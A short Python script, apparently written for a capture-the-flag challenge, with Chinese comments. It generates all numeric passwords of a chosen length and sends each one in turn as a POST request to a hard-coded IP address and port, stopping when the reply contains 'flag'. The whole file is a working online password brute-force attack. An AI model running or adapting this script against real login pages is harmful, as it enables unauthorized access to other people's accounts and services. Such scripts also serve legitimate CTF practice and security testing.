import urllib
import requests
import time
import threading
#from bs4 import BeautifulSoup

# 1.密码生成
print("请输入纯数字密码位数：")
input_len = input()

min_num = 10000
max_num = '9' * (int(input_len))
passwords_list = []

for i in range(min_num,int(max_num)+1):
    if len(str(i)) < int(input_len):
        i = '0' * (int(input_len)-len(str(i)))+str(i)
    passwords_list.append(i)

print("密码生成完毕!")

# 2.将生成的密码带入进行测试
for password in passwords_list:
    test = requests.post('http://114.67.175.224:15783/',data={'pwd': password})
    print('当前测试的密码为：')
    print(password)
    #time.sleep(0.5)   #此处的延时可加可不加
    if 'flag' in test.text:
        print('正确的密码为：')
        print(password)
        break

print('执行完毕！')
